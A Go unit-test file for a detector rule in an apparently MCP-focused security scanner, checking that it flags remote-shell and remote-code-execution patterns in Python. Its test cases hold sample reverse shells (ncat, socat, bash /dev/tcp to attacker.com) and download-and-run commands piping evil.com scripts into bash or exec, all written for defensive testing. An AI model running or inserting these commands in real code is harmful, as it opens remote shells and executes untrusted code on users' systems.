package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/static_analysis"
	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/python"
)

func TestRemoteAttacksRule_ID(t *testing.T) {
	rule := NewRemoteAttacksRule()
	expected := "MCP-DTI-003-REMOTE"
	if rule.ID() != expected {
		t.Errorf("ID() = %v, want %v", rule.ID(), expected)
	}
}

func TestRemoteAttacksRule_Description(t *testing.T) {
	rule := NewRemoteAttacksRule()
	if rule.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestRemoteAttacksRule_AppliesToLanguage(t *testing.T) {
	rule := NewRemoteAttacksRule()
	expected := "python"
	if rule.AppliesToLanguage() != expected {
		t.Errorf("AppliesToLanguage() = %v, want %v", rule.AppliesToLanguage(), expected)
	}
}

func TestRemoteAttacksRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
		attackID     string
	}{
		// Remote Listener attacks (III-A1f)
		{
			name: "netcat listener",
			code: `
os.system("nc -lvp 4444")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "ncat with exec",
			code: `
os.system("ncat -e /bin/bash attacker.com 4444")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "socat reverse shell",
			code: `
os.system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "socket server",
			code: `
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(1)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "pty spawn",
			code: `
import pty
pty.spawn("/bin/bash")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "bash reverse shell",
			code: `
os.system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "interactive shell",
			code: `
subprocess.call(["/bin/bash", "-i"])
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},
		{
			name: "os.dup2 for shell redirection",
			code: `
import os
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "REMOTE-LISTENER",
		},

		// RCE attacks (III-A1h)
		{
			name: "eval function",
			code: `
user_code = input()
eval(user_code)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "exec function",
			code: `
code = "import os; os.system('whoami')"
exec(code)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "compile with exec mode",
			code: `
code = compile("print('hello')", "<string>", "exec")
exec(code)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "dynamic import",
			code: `
module = __import__(user_input)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "importlib import_module",
			code: `
import importlib
mod = importlib.import_module(module_name)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "curl pipe to bash",
			code: `
os.system("curl http://evil.com/script.sh | bash")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "wget pipe to python",
			code: `
os.system("wget -O - http://evil.com/malware.py | python")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "requests get and exec",
			code: `
import requests
code = requests.get("http://evil.com/payload.py").text
exec(code)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "base64 decode and exec",
			code: `
import base64
code = base64.b64decode(encoded_payload)
exec(code)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "marshal loads",
			code: `
import marshal
code_obj = marshal.loads(data)
exec(code_obj)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},
		{
			name: "getattr with call",
			code: `
func = getattr(module, method_name)
func()
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "RCE",
		},

		// Clean code
		{
			name: "safe function",
			code: `
def safe_function():
    return "Hello, World!"
`,
			wantFindings: false,
			minFindings:  0,
		},
		{
			name: "safe http request",
			code: `
import requests
response = requests.get("https://api.example.com/data")
data = response.json()
`,
			wantFindings: false,
			minFindings:  0,
		},
	}

	rule := NewRemoteAttacksRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse Python code: %v", err)
			}

			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}

			if tt.wantFindings {
				if len(findings) < tt.minFindings {
					t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
				}
			} else {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			}
		})
	}
}

func TestRemoteAttacksRule_EvaluateNonPythonAST(t *testing.T) {
	rule := NewRemoteAttacksRule()
	findings, err := rule.Evaluate("not a python ast")
	if err != nil {
		t.Errorf("Evaluate() should not error on non-Python AST, got %v", err)
	}
	if findings != nil {
		t.Errorf("Evaluate() should return nil for non-Python AST, got %v", findings)
	}
}

func TestRemoteAttacksRule_Severity(t *testing.T) {
	tests := []struct {
		name             string
		code             string
		expectedSeverity string
	}{
		{
			name:             "eval should be critical",
			code:             `eval(user_input)`,
			expectedSeverity: static_analysis.SeverityCritical,
		},
		{
			name:             "exec should be critical",
			code:             `exec(code)`,
			expectedSeverity: static_analysis.SeverityCritical,
		},
		{
			name:             "pty.spawn should be critical",
			code:             `pty.spawn("/bin/bash")`,
			expectedSeverity: static_analysis.SeverityCritical,
		},
	}

	rule := NewRemoteAttacksRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}

			findings, _ := rule.Evaluate(ast)
			if len(findings) > 0 {
				if findings[0].Severity != tt.expectedSeverity {
					t.Errorf("Expected severity %s, got %s", tt.expectedSeverity, findings[0].Severity)
				}
			}
		})
	}
}
